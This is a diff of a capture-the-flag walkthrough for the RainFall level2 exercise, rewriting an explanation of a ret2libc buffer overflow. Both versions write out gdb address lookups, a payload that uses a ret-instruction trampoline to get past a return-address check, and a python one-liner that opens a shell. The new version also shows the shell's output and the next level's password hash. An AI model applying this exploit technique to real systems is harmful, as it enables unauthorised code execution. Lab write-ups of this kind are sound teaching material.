@@ -39,8 +39,8 @@ Dump of assembler code for function p:
    0x080484da <+6>:     mov    0x8049860,%eax
    0x080484df <+11>:    mov    %eax,(%esp)
    0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> #Flush the output
-   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax # Load a 0x4c (76) bytes buffer
-   0x080484ea <+22>:    mov    %eax,(%esp) # Put the buffer at the top of the stack
+   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax # Load EBP - 76 address into eax
+   0x080484ea <+22>:    mov    %eax,(%esp) # Put the buffer pointer at the top of the stack
    0x080484ed <+25>:    call   0x80483c0 <gets@plt> # gets(buffer)
    0x080484f2 <+30>:    mov    0x4(%ebp),%eax # Load the saved return address into eax
    0x080484f5 <+33>:    mov    %eax,-0xc(%ebp) # Save it into a variable
@@ -150,73 +150,38 @@ End of assembler dump.
        +------------------+
 ```
 
-## Ret instruction
-
 ### Explanation
-Let's explain how the call instruction and ret instruction (return) works first, will take simple C code as an exemple
 
-```c
-void blue() {
-   //step 2
-}
+32-bit binary, unbounded gets, anti-libc/stack check on the saved return address, so `ret2libc` + a ret trampoline.
 
-int main() {
-   //step 1
-    blue();
-    //step 3
-    return 0;
-}
-```
+The path the we need to exploit is the path B, lets keep only the necessary instruction of the B path for clarity
 
-here is the asm code
 ```sh
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080483c3 <+0>:     push   %ebp # Save caller's EBP (base pointer of caller's stack frame)
-   0x080483c4 <+1>:     mov    %esp,%ebp # Set EBP = ESP (base pointer of current stack frame = pointer of top of stack) note that EBP is const and ESP will get updated as values are pushed / popped of the stack
-   0x080483c6 <+3>:     call   0x080483b4 <blue> # Call blue: push return address and jump to blue
-   0x080483cb <+8>:     pop    %ebp # Restore caller's EBP
-   0x080483cc <+9>:     ret    # return from main
-End of assembler dump.
-(gdb) disas blue
-Dump of assembler code for function blue:
-   0x080483b4 <+0>:     push   %ebp # Save caller's base pointer (from main) onto the stack
-   0x080483b5 <+1>:     mov    %esp,%ebp # Establish blue's stack frame
-   0x080483b7 <+3>:     pop    %ebp # Restore main's base pointer (Remove blue's frame)
-   0x080483b8 <+4>:     ret # pops the return address (pushed by call in main) and jumps to it
-End of assembler dump.
+lea    -0x4c(%ebp),%eax; # Load address EBP-76 into eax (buffer)
+mov    %eax,(%esp) # move eax to the top of the stack
+call   0x80483c0 <gets@plt> # call gets(buffer)
+...
+mov    -0xc(%ebp),%eax # store the EBP + 4 into a variable 
+cmp    $0xb0000000,%eax # check if the variable is a libc address
+....
+leave  # ESP = EBP ; pop %ebp      (EBP = *ESP ; ESP += 4)
+0x0804853e ret   # EIP = *ESP ; ESP += 4
 ```
 
-So after calling blue() we return to the main function at step3.
-There is no exploit possible here. It was just a simple way to explain how the call and ret instructions work
+So in order to exploit it we first need to `overflow` the buffer passed to `gets()`
+The buffer address is located at `EBP-76` so we need 76 padding characters to reach EBP, 4 more to reach EBP + 4 where we store the future EIP value
 
-Now that we explain ret, let's see ret2libc
+For the EIP value we will use the ret address directly 
 
-## Ret2Libc
-
-Ret2Libc attack is a buffer overflow which goal is to replace the default return address with the address of a Libc function (system in this case)
-```
-+------------------------------------------------------+---------------+---------------------+
-|  Local Variables:                                    |   Saved EBP   |   Saved Return Addr |
-|  - Local Buffer (64 bytes)                           |   (4 bytes)   |    (4 bytes)        |
-|  - (other local variables, if any)                   |               |                     |
-+------------------------------------------------------+---------------+---------------------+
-```
-```c
-void func()
-{
-   char buffer[64];
-   gets(buffer);
-   return ;
-}
-```
-
-To do this we need to reach the return address position. [How to reach return address position](https://github.com/Junya42/Rainfall/tree/main/level1/walkthrough.md#eip-register-anchor)
-Which is at offset: 68 (buffer 64 bytes + saved_ebp 4 bytes)
-
-Then we need to retrieve the address of libc:system.
+So our payload looks like this for now
 ```sh
-level2@RainFall:~$ gdb level2 
+80 random padding characters
+0x0804853e # ret address
+```
+
+When it will reach the `ret` instruction it will be executed and then it will re-execute the `ret` instruction once more using this time the value stored in EBP + 8 so we need to store in EBP + 8 our real target address this time, let's retrieve the address of `system()` and since the system call will also need its own return address (in EBP + 12) we can also retrieve the address of `exit()` to exit cleanly when we're done
+
+```sh
 (gdb) b main
 Breakpoint 1 at 0x8048542
 (gdb) run
@@ -224,123 +189,56 @@ Starting program: /home/user/level2/level2
 
 Breakpoint 1, 0x08048542 in main ()
 (gdb) p system
-$1 = {<text variable, no debug info>} 0xb7e6b060 <system> #address of system
-```
-
-Them we also need the address of the exit function.
-Why do need exit's address ?
-
-System is a function, and it also need a valid return address, we are using exit by default to leave the program cleanly
-```sh
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) p exit
 $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 ```
 
-Now we need the address of the string "/bin/sh" to send it as an argument for system()
+We will also need the address of `"/bin/sh"` in order to pass it as an argument to system (to store in EBP + 16), luckily the string is stored directly in the libc so we can retrieve it like this
+
 ```sh
+(gdb) b main
+Breakpoint 1 at 0x8048542
+(gdb) run
+Starting program: /home/user/level2/level2 
+
+Breakpoint 1, 0x08048542 in main ()
 (gdb) info proc map
-process 2938
+process 2632
 Mapped address spaces:
 
         Start Addr   End Addr       Size     Offset objfile
          0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
          0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
-        0xb7e2b000 0xb7e2c000     0x1000        0x0
-      [0xB7E2C000] 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so #Start addr
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
         0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-        0xb7fd1000 [0xB7FD2000]     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so #End addr
-        0xb7fd2000 0xb7fd5000     0x3000        0x0
-        0xb7fdb000 0xb7fdd000     0x2000        0x0
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
         0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
         0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
         0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
         0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
         0xbffdf000 0xc0000000    0x21000        0x0 [stack]
-(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh" # find string "/bin/sh" from start of libc [0xB7E2C000] to end of libc [0xB7FD2000]
-0xb7f8cc58
-1 pattern found.
-(gdb)
+(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh" # 0xb7e2c000 = start of libc, 0xb7fd2000 end of libc
+0xb7f8cc58 # Address of the string "/bin/sh"
+1 pattern found
 ```
 
-So we need to put some paddings ('a' * 64) inside the buffer first until we saved ebp,
-then we also need some paddings ('b' * 4) to skip the saved ebp
-
-At this point we reached the return address so we need to put the address of system in little-endian format 
-(0xb7e6b060 -> \x60\xb0\xe6\xb7)
-
-Now we need to give a return address for system which will be the address of exit in little-endian format
-(0xb7e5ebe0 -> \xe0\xeb\xe5\xb7)
-
-And then the argument for system which is the address of "/bin/sh" in little-endian format once again
-(0xb7f8cc58 -> \x58\xcc\xf8\xb7)
-
-This would look like this:
+So now we have our complete payload
 ```sh
-[ aaaaaaaaaaaaa..... ] # padding to reach saved ebp
-[ bbbb ] # padding to reach return address
-[ \x60\xb0\xe6\xb7 ] # set return address to system()
-[ \xe0\xeb\xe5\xb7 ] # set ebp + 4 = return address of system() = exit()
-[ \x58\xcc\xf8\xb7 ] # set ebp + 8 = "/bin/sh" = First argument = system("/bin/sh")
+80 random padding characters
+0x0804853e # ret address (pass the check, perform the trampoline trick)
+0xb7e6b060 # system address
+0xb7e5ebe0 # exit address
+0xb7f8cc58 # "/bin/sh" address
 ```
-
-We can do it all in one line using python, notice the usage of cat
-It will allow stdin to stay to open in order for us to interact with the shell
-
 ```sh
-(python -c "print('a' * 64 + 'b' * 4 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./a.out
-```
-
-## Solution
-
-Finally after a lot of explanations we reached the solution.
-
-We just have one more issue.
-
-Remember the diagram showing the program execution, there is a check on the return address that verifies if it lies below 0xb0000000,
-and that is the case for the address of system which is located at 0xb7e6b060
-
-So we need to bypass this, to avoid exiting the program before reach the ret instruction.
-
-In order to do this we can exploit the ret instruction itself.
-
-If we put \x3e\x85\x04\x08 (0x0804853e, the address of the ret instruction of function p) as the return address
-and offset everything else by 4 bytes we obtain this:
-```sh
-[ aaaaaaaaaaaaa..... ] # padding to reach saved ebp
-[ bbbb ] # padding to reach return address
-[ \x3e\x85\x04\x08 ] # set return address to 'ret' instruction (trampoline) (bypass the check)
-[ \x60\xb0\xe6\xb7 ] # This value is popped by the trampoline and becomes the new return address (system())
-[ \xe0\xeb\xe5\xb7 ] # Fake return address for system() (exit() address)
-[ \x58\xcc\xf8\xb7 ] # First argument for system() (pointer to the string "/bin/sh")
-```
-
-Which result in this command:
-```sh
-level2@RainFall:~$ (python -c "print('a' * 76 + 'b' * 4 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level2
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>�aaaaaaaabbbb>�`�����X���
+level2@RainFall:~$ (python -c 'print "a"*80  + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' ; cat) | ./level2
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>aaaaaaaaaaaa>`�����X���
+whoami
+level3
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
-
-
-##### Explanation:
-
-Padding to Saved EBP:
-- The first section (aaaaaaaaaaaaa.....) fills the buffer and reaches the saved EBP.
-
-Overwrite Saved EBP:
-- The next 4 bytes (bbbb) overwrite the saved EBP; their value is not critical (often junk).
-
-Trampoline (Ret Instruction):
-- The following 4 bytes (\x3e\x85\x04\x08) replace the saved return address with the address of a ret instruction in your binary. This trampoline address bypasses the check that would otherwise catch a libc address.
-
-System() Address:
-- The trampoline’s ret pops the next 4 bytes (\x60\xb0\xe6\xb7) off the stack, making that value the new return address. This should be the address of system().
-
-Fake Return Address for system():
-- The next 4 bytes (\xe0\xeb\xe5\xb7) serve as system()’s return address. They’re typically set to the address of exit() so that if system() returns, the program terminates gracefully.
-
-Argument for system():
-- The final 4 bytes (\x58\xcc\xf8\xb7) point to the string "/bin/sh", which becomes the first argument for system(), causing it to execute system("/bin/sh").
-
-This chain ensures that control flows correctly: the vulnerable function returns to the trampoline, which then directs execution to system() with the proper arguments.
